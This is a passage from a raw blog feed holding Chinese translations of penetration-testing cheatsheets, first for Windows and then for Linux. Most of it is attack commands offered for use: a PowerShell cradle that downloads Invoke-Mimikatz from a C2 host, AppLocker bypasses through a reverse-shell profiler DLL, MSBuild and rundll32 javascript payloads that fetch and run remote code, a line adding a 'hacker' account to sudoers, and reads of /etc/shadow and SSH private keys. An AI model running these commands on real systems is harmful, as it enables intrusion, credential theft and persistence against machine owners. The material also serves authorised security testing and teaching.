set Sscript block base64 PS</span><br><span class="line"></span><br><span class="line">SET SCRIPTBLOCK powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAWQBvAHUAIABjAGEAbgAgAHUAcwBlACAAYgBhAHMAaQBjACAALQBlAG4A==</span><br></pre></td></tr></table></figure><h2 id="8-2-调用-CradleCraft"><a href="#8-2-调用-CradleCraft" class="headerlink" title="8.2 调用-CradleCraft"></a>8.2 调用-CradleCraft</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-CradleCrafter</span><br><span class="line"></span><br><span class="line">Similar to Invoke-Obfusaction but allows you to obfusacte cradles for downloading i/e</span><br><span class="line"></span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(&apos;http://c2server.com/Invoke-Mimikatz.ps1&apos;)</span><br></pre></td></tr></table></figure><h2 id="8-3-调用DOSfuscation"><a href="#8-3-调用DOSfuscation" class="headerlink" title="8.3 调用DOSfuscation"></a>8.3 调用DOSfuscation</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-DOSfuscation</span><br></pre></td></tr></table></figure><h2 id="8-4-Unicorn"><a href="#8-4-Unicorn" class="headerlink" title="8.4 Unicorn"></a>8.4 Unicorn</h2><blockquote><p><a href="https://github.com/trustedsec/unicorn" target="_blank" rel="noopener">https://github.com/trustedsec/unicorn</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicorn.py Nishang.ps1</span><br></pre></td></tr></table></figure><h1 id="0x09-AppLocker-约束模式绕过"><a href="#0x09-AppLocker-约束模式绕过" class="headerlink" title="0x09 AppLocker /约束模式绕过"></a>0x09 AppLocker /约束模式绕过</h1><h2 id="9-1-验证您是否处于受限模式"><a href="#9-1-验证您是否处于受限模式" class="headerlink" title="9.1 验证您是否处于受限模式"></a>9.1 验证您是否处于受限模式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ExecutionContext.SessionState.LanguageMode</span><br></pre></td></tr></table></figure><h2 id="9-2-Powershell非常少旁路"><a href="#9-2-Powershell非常少旁路" class="headerlink" title="9.2 Powershell非常少旁路"></a>9.2 Powershell非常少旁路</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/decoder-it/powershellveryless.git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll </span><br><span class="line">/out:C:\Users\m0chan\Scripts\powershellveryless.exe </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll /out:c:\setup\powershellveryless.exe c:\scripts\powershellveryless.cs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Execute -&gt; powershellveryless.exe script.ps1</span><br><span class="line"></span><br><span class="line">script.ps1 = Script of your Choice</span><br></pre></td></tr></table></figure><h2 id="9-3-世界可写文件夹（在Windows-10-1803上为默认）"><a href="#9-3-世界可写文件夹（在Windows-10-1803上为默认）" class="headerlink" title="9.3 世界可写文件夹（在Windows 10 1803上为默认）"></a>9.3 世界可写文件夹（在Windows 10 1803上为默认）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</span><br><span class="line"></span><br><span class="line">C:\Windows\Tasks </span><br><span class="line">C:\Windows\Temp </span><br><span class="line">C:\windows\tracing</span><br><span class="line">C:\Windows\Registration\CRMLog</span><br><span class="line">C:\Windows\System32\FxsTmp</span><br><span class="line">C:\Windows\System32\com\dmp</span><br><span class="line">C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys</span><br><span class="line">C:\Windows\System32\spool\PRINTERS</span><br><span class="line">C:\Windows\System32\spool\SERVERS</span><br><span class="line">C:\Windows\System32\spool\drivers\color</span><br><span class="line">C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter</span><br><span class="line">C:\Windows\SysWOW64\FxsTmp</span><br><span class="line">C:\Windows\SysWOW64\com\dmp</span><br><span class="line">C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter</span><br><span class="line">C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System</span><br></pre></td></tr></table></figure><h2 id="9-4-降级攻击"><a href="#9-4-降级攻击" class="headerlink" title="9.4 降级攻击"></a>9.4 降级攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Downgrading to PS Version 2 circumvates Constrained Mode</span><br><span class="line"></span><br><span class="line">powershell.exe -version 2</span><br><span class="line"></span><br><span class="line">Verifiy versions with $PSVersionTable</span><br><span class="line">Get-Host</span><br></pre></td></tr></table></figure><h2 id="9-5-AppLocker-COR配置文件绕过"><a href="#9-5-AppLocker-COR配置文件绕过" class="headerlink" title="9.5 AppLocker COR配置文件绕过"></a>9.5 AppLocker COR配置文件绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set COR_ENABLE_PROFILING=1</span><br><span class="line">COR_PROFILER=&#123;cf0d821e-299b-5307-a3d8-b283c03916db&#125;</span><br><span class="line">set COR_PROFILER_PATH=C:\Users\m0chan\pwn\reverseshell.dll</span><br><span class="line">tzsync</span><br><span class="line">powershell</span><br><span class="line"></span><br><span class="line">Where .DLL is your payload i/e reverse shell, beacon etc.</span><br></pre></td></tr></table></figure><h2 id="9-6-MSBuild-Powershell-CMD旁路"><a href="#9-6-MSBuild-Powershell-CMD旁路" class="headerlink" title="9.6 MSBuild Powershell / CMD旁路"></a>9.6 MSBuild Powershell / CMD旁路</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">You can use this if cmd is not disabled but powershell is</span><br><span class="line"></span><br><span class="line">https://github.com/Cn33liz/MSBuildShell/blob/master/MSBuildShell.csproj</span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe pshell.csproj</span><br><span class="line"></span><br><span class="line">Also https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c</span><br><span class="line"></span><br><span class="line">MSBuild PSAttack :D :D</span><br></pre></td></tr></table></figure><h2 id="9-7-PSAttack"><a href="#9-7-PSAttack" class="headerlink" title="9.7 PSAttack"></a>9.7 PSAttack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/jaredhaight/PSAttack</span><br><span class="line"></span><br><span class="line">Use if Powershell.exe is not available. this does not rely on powershell.exe, but Instead directly calls powershell through .NET Framework circumvating most application whitelisting etc.</span><br><span class="line"></span><br><span class="line">Has numerous modules prebuilt in and is built in C Sharp / .NET so can be reflectively loaded :)</span><br></pre></td></tr></table></figure><h2 id="9-8-NoPowerShell"><a href="#9-8-NoPowerShell" class="headerlink" title="9.8 NoPowerShell"></a>9.8 NoPowerShell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/bitsadmin/nopowershell</span><br><span class="line"></span><br><span class="line">Primiarily to be used with Cobalt &amp; Execute Assembly but can also be reflectively loaded from any other C2 infra.</span><br></pre></td></tr></table></figure><h2 id="9-9-runDLL32绕过"><a href="#9-9-runDLL32绕过" class="headerlink" title="9.9 runDLL32绕过"></a>9.9 runDLL32绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#Reference: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</span><br><span class="line"></span><br><span class="line">rundll32.exe is a .exe found on all Windows based systems located at C:\Windows\system32\rundll32.exe</span><br><span class="line"></span><br><span class="line">rundll32 shell32.dll,Control_RunDLL payload.dll</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &lt;HTML Code&gt;</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&apos;http://ip:port/&apos;);&quot;</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml.dll,RunHTMLApplication &quot;;eval(&quot;w=new%20ActiveXObject(\&quot;WScript.Shell\&quot;);w.run(\&quot;calc\&quot;);window.close()&quot;);</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;)</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;本文为翻译文章，为了记录在对Windows系统进行渗透测试过程中的一些命令和知识。&lt;/p&gt;
&lt;p&gt;原文链接：&lt;a href=&quot;https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux Notes</title>
    <link href="https://www.mad-coding.cn/2019/10/11/Linux%E6%B3%A8%E9%87%8A-%E5%A4%87%E5%BF%98%E5%8D%95/"/>
    <id>https://www.mad-coding.cn/2019/10/11/Linux注释-备忘单/</id>
    <published>2019-10-11T07:19:12.000Z</published>
    <updated>2019-10-11T07:38:39.719Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文是翻译文章：记录在渗透测试过程中，经常会使用的Linux命令。</p><p>原文地址：<a href="https://m0chan.github.io/2018/07/31/Linux-Notes-And-Cheatsheet.html" target="_blank" rel="noopener">https://m0chan.github.io/2018/07/31/Linux-Notes-And-Cheatsheet.html</a></p><a id="more"></a><h1 id="0x01-列举"><a href="#0x01-列举" class="headerlink" title="0x01 列举"></a>0x01 列举</h1><h2 id="1-1-基本命令"><a href="#1-1-基本命令" class="headerlink" title="1.1 基本命令"></a>1.1 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">hostname </span><br><span class="line">uname -a</span><br><span class="line">cat /etc/password</span><br><span class="line">cat /etc/shadow</span><br><span class="line">groups</span><br><span class="line">ifconfig</span><br><span class="line">netstat -an</span><br><span class="line">ps aux | grep root</span><br><span class="line">uname -a</span><br><span class="line">env</span><br><span class="line">id</span><br><span class="line">cat /proc/version</span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/group</span><br><span class="line">cat /etc/shadow</span><br><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure><h2 id="1-2-侦察"><a href="#1-2-侦察" class="headerlink" title="1.2 侦察"></a>1.2 侦察</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">秘密的扫毛系统开放的端口</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYN洪泛扫描</span></span><br><span class="line">nmap -sS INSERTIPADDRESS</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全端口扫描</span></span><br><span class="line">nmap INSERTIPADDRESS -p-</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务版本，默认脚本，操作系统探测</span></span><br><span class="line">nmap INSERTIPADDRESS -sV -sC -O -p 111,222,333</span><br><span class="line"></span><br><span class="line"><span class="comment">#UDP扫描</span></span><br><span class="line">nmap INSERTIPADDRESS -sU</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用UDP的方式连接开放的端口</span></span><br><span class="line">nc -u INSERTIPADDRESS 48772</span><br></pre></td></tr></table></figure><h2 id="1-3-UDP扫描"><a href="#1-3-UDP扫描" class="headerlink" title="1.3 UDP扫描"></a>1.3 UDP扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udpprotocolscanner &lt;ip&gt;</span><br></pre></td></tr></table></figure><h2 id="1-4-FTP枚举"><a href="#1-4-FTP枚举" class="headerlink" title="1.4 FTP枚举"></a>1.4 FTP枚举</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS</span><br></pre></td></tr></table></figure><h2 id="1-5-启动Web服务器"><a href="#1-5-启动Web服务器" class="headerlink" title="1.5 启动Web服务器"></a>1.5 启动Web服务器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure><h1 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h1><p>libSSH身份验证绕过-CVE-2018-10933</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/blacknbunny/libSSH-Authentication-Bypass</span><br><span class="line"></span><br><span class="line">Use nc &lt;ip&gt; 22 to banner grab the SSH Service, if it&apos;s running vulnerable version of libSSH then you can bypass</span><br></pre></td></tr></table></figure><h1 id="0x03-特权提升"><a href="#0x03-特权提升" class="headerlink" title="0x03 特权提升"></a>0x03 特权提升</h1><h2 id="3-1-基本命令"><a href="#3-1-基本命令" class="headerlink" title="3.1 基本命令"></a>3.1 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version &lt;- Check for kernel exploits</span><br><span class="line">ps auxww</span><br><span class="line">ps -ef</span><br><span class="line">lsof -i</span><br><span class="line">netstat -laputen</span><br><span class="line">arp -e</span><br><span class="line">route</span><br><span class="line">cat /sbin/ifconfig -a</span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/networks</span><br><span class="line">iptables -L</span><br><span class="line">hostname</span><br><span class="line">dnsdomainname</span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls /boot | grep vmlinuz-</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><h2 id="3-2-运行pspy64"><a href="#3-2-运行pspy64" class="headerlink" title="3.2 运行pspy64"></a>3.2 运行pspy64</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/DominicBreuker/pspy</span><br><span class="line"></span><br><span class="line">Run in background and watch for any processes running</span><br></pre></td></tr></table></figure><h2 id="3-3-生成TTY"><a href="#3-3-生成TTY" class="headerlink" title="3.3 生成TTY"></a>3.3 生成TTY</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</span><br><span class="line"></span><br><span class="line">python -c &apos;import pty; pty.spawn(&quot;/bin/sh&quot;)&apos;</span><br><span class="line">echo os.system(&apos;/bin/bash&apos;)</span><br><span class="line">awk &apos;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&apos;</span><br><span class="line">find / -name blahblah &apos;exec /bin/awk &apos;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&apos; \;</span><br><span class="line">python: exit_code = os.system(&apos;/bin/sh&apos;) output = os.popen(&apos;/bin/sh&apos;).read()</span><br><span class="line">perl -e &apos;exec &quot;/bin/sh&quot;;&apos;</span><br><span class="line">perl: exec &quot;/bin/sh&quot;;</span><br><span class="line">ruby: exec &quot;/bin/sh&quot;</span><br><span class="line">lua: os.execute(&apos;/bin/sh&apos;)</span><br><span class="line">irb(main:001:0&gt; exec &quot;/bin/sh&quot;</span><br><span class="line">Can also use socat</span><br></pre></td></tr></table></figure><h2 id="3-4-枚举脚本"><a href="#3-4-枚举脚本" class="headerlink" title="3.4 枚举脚本"></a>3.4 枚举脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /EscalationServer/</span><br><span class="line">chmod u+x linux_enum.sh</span><br><span class="line">chmod 700 linuxenum.py</span><br><span class="line"></span><br><span class="line">./linux_enum.sh</span><br><span class="line">python linuxenum.py</span><br></pre></td></tr></table></figure><h2 id="3-5-将用户添加到Sudoers"><a href="#3-5-将用户添加到Sudoers" class="headerlink" title="3.5 将用户添加到Sudoers"></a>3.5 将用户添加到Sudoers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;hacker ALL=(ALL:ALL) ALL&quot; &gt;&gt; /etc/sudoers</span><br></pre></td></tr></table></figure><h2 id="3-6-列出CronJobs"><a href="#3-6-列出CronJobs" class="headerlink" title="3.6 列出CronJobs"></a>3.6 列出CronJobs</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure><h2 id="3-7-检查SSH可读SSH密钥的持久性和提升"><a href="#3-7-检查SSH可读SSH密钥的持久性和提升" class="headerlink" title="3.7 检查SSH可读SSH密钥的持久性和提升"></a>3.7 检查SSH可读SSH密钥的持久性和提升</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/authorized_keys</span><br><span class="line">cat ~/.ssh/identity.pub</span><br><span class="line">cat ~/.ssh/identity</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">cat ~/.ssh/id_rsa</span><br><span class="line">cat ~/.ssh/id_dsa.pub</span><br><span class="line">cat ~/.ssh/id_dsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_key</span><br></pre></td></tr></table></figure><h2 id="3-8-启动脚本"><a href="#3-8-启动脚本" class="headerlink" title="3.8 启动脚本"></a>3.8 启动脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -o+w -type f 2&gt;/dev/null | grep -v &apos;/proc\|/dev&apos;</span><br></pre></td></tr></table></figure><h2 id="3-9-查找用户或组的可写文件"><a href="#3-9-查找用户或组的可写文件" class="headerlink" title="3.9 查找用户或组的可写文件"></a>3.9 查找用户或组的可写文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / perm /u=w -user `whoami` 2&gt;/dev/null</span><br><span class="line">find / -perm /u+w,g+w -f -user `whoami` 2&gt;/dev/null</span><br><span class="line">find / -perm /u+w -user `whoami` 2&gt;/dev/nul</span><br></pre></td></tr></table></figure><h2 id="3-10-查找用户或组的可写目录"><a href="#3-10-查找用户或组的可写目录" class="headerlink" title="3.10 查找用户或组的可写目录"></a>3.10 查找用户或组的可写目录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / perm /u=w -type -d -user `whoami` 2&gt;/dev/null</span><br><span class="line">find / -perm /u+w,g+w -d -user `whoami` 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="3-11-嗅探流量"><a href="#3-11-嗅探流量" class="headerlink" title="3.11 嗅探流量"></a>3.11 嗅探流量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 &lt;protocol&gt;</span><br><span class="line">tcpdump -i any -s0 -w capture.pcap</span><br><span class="line">tcpdump -i eth0 -w capture -n -U -s 0 src not 192.168.1.X and dst not 192.168.1.X</span><br><span class="line">tcpdump -vv -i eth0 src not 192.168.1.X and dst not 192.168.1.X</span><br></pre></td></tr></table></figure><h2 id="3-12-用户安装的软件（有时配置错误）"><a href="#3-12-用户安装的软件（有时配置错误）" class="headerlink" title="3.12 用户安装的软件（有时配置错误）"></a>3.12 用户安装的软件（有时配置错误）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/</span><br><span class="line">/usr/local/src</span><br><span class="line">/usr/local/bin</span><br><span class="line">/opt/</span><br><span class="line">/home</span><br><span class="line">/var/</span><br><span class="line">/usr/src/</span><br></pre></td></tr></table></figure><h1 id="0x04-exploit"><a href="#0x04-exploit" class="headerlink" title="0x04 exploit"></a>0x04 exploit</h1><h2 id="4-1-获得权限"><a href="#4-1-获得权限" class="headerlink" title="4.1 获得权限"></a>4.1 获得权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="4-2-获取SUID二进制文件"><a href="#4-2-获取SUID二进制文件" class="headerlink" title="4.2 获取SUID二进制文件"></a>4.2 获取SUID二进制文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="4-3-检查Sudo配置"><a href="#4-3-检查Sudo配置" class="headerlink" title="4.3 检查Sudo配置"></a>4.3 检查Sudo配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><h1 id="0x05-文件传输"><a href="#0x05-文件传输" class="headerlink" title="0x05 文件传输"></a>0x05 文件传输</h1><h2 id="5-1-base64"><a href="#5-1-base64" class="headerlink" title="5.1 base64"></a>5.1 base64</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat file.transfer | base64 -w 0 </span><br><span class="line">echo base64blob | base64 -d &gt; file.transfer</span><br></pre></td></tr></table></figure><h2 id="5-2-curl"><a href="#5-2-curl" class="headerlink" title="5.2 curl"></a>5.2 curl</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://webserver/file.txt &gt; output.txt</span><br></pre></td></tr></table></figure><h2 id="5-3-wget"><a href="#5-3-wget" class="headerlink" title="5.3 wget"></a>5.3 wget</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://webserver/file.txt &gt; output.txt</span><br></pre></td></tr></table></figure><h2 id="5-4-FTP"><a href="#5-4-FTP" class="headerlink" title="5.4 FTP"></a>5.4 